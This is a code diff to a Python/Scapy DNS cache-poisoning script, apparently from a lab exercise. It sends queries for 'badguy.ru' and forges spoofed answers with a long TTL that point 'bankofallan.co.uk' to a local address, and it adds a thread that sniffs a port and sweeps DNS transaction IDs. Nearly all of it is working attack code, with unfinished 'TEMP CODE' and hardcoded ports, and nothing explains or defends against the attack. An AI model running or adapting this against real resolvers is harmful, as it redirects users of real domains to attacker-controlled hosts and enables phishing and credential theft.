@@ -5,7 +5,7 @@ import socket
 import signal
 import threading
 from threads.DNSRequestSender import DNS_Sender
-
+from threads.DNSPoisonerThread import DNSPoisonerThread
 
 def build_dns_request_packet(destination_ip, destination_port, query_name):
     id=0
@@ -14,7 +14,7 @@ def build_dns_request_packet(destination_ip, destination_port, query_name):
 def build_dns_poisoner_packet(destination_ip, destination_port, source_ip,source_port,query_to_forger, fake_ip, ttl):
     id = 0
     dnsqr = DNSQR(qname=query_to_forger).qname
-    dns_resp = IP(dst=destination_ip, src=source_ip) / UDP(dport=destination_port, sport=source_port) / DNS(id=id,
+    dns_resp = IP(dst=destination_ip, src=source_ip) / UDP(dport=5312, sport=2322) / DNS(id=id,
                                                                                                               qd=DNSQR(
                                                                                                                   qname=query_to_forger,
                                                                                                               ),
@@ -45,20 +45,28 @@ local_ip = "192.168.56.1"
 local_port_dns = 55553
 dns_port = 53
 ttl_to_poison = 50000
+bad_guy_domain = "badguy.ru"
 query_to_forger = "bankofallan.co.uk."
 #setting signal such that we can use ctrl+c
 signal.signal(signal.SIGINT, sig_hand)
 global dns_request_sender
 dns_request_sender = DNS_Sender()
-dns_request_sender.set_packet(  build_dns_request_packet(dns_ip, dns_port, query_to_forger) )
+dns_request_sender.set_number_of_packets_to_send(1)
+dns_request_sender.set_packet(  build_dns_request_packet(dns_ip, dns_port, bad_guy_domain) )
 sender_thread = dns_request_sender.get_thread()
 global dns_poisoner
 dns_poisoner = DNS_Sender()
-dns_poisoner.set_packet( build_dns_poisoner_packet(dns_ip, dns_port, local_ip, local_port_dns, query_to_forger, local_ip, ttl_to_poison) )
-dns_poisoner_thread = dns_poisoner.get_thread()
+#TEMP CODE
+dns_test = DNSPoisonerThread()
+dns_test.set_packet(build_dns_poisoner_packet(dns_ip, dns_port, local_ip, local_port_dns, query_to_forger, local_ip, ttl_to_poison))
+dns_test.set_port_to_sniff(local_port_dns)
+dns_test.set_id_range_of_attack(1000)
+dns_test.run_thread()
+#END TEMP CODE
+dns_poisoner.set_packet( build_dns_poisoner_packet(dns_ip, dns_port, local_ip, local_port_dns, bad_guy_domain, local_ip, ttl_to_poison) )
 udp_socket = launch_dns_listen_server(localhost, local_port, buffer_size)
-dns_poisoner_thread.start()
-# sender_thread.start()
+#dns_poisoner.run_thread()
+sender_thread.start()
 bytePair = udp_socket.recvfrom(buffer_size)
 #ends thread runs
 dns_request_sender.end_thread()
